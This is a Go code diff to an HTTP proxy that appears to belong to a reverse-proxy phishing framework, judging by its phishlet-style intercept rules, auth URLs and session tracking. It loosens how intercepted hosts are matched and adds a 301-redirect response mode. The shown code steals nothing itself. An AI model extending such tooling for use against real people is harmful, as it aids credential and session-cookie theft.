@@ -861,15 +861,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check if request should be intercepted
 				if pl != nil {
-					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
-						for _, ic := range pl.intercept {
-							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
-							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
-							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
-								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
-							}
+					//if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
+					for _, ic := range pl.intercept {
+						//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
+						//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
+						if ic.domain == req.Host && ic.path.MatchString(req.URL.Path) {
+							return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
 						}
 					}
+					//}
 				}
 
 				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
@@ -1318,6 +1318,12 @@ func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Respon
 }
 
 func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body string, mime string) (*http.Request, *http.Response) {
+	if mime == "text/redirect" {
+		// 301重定向
+		resp := goproxy.NewResponse(req, mime, http.StatusMovedPermanently, "")
+		resp.Header.Set("Location", body)
+		return req, resp
+	}
 	if mime == "" {
 		mime = "text/plain"
 	}
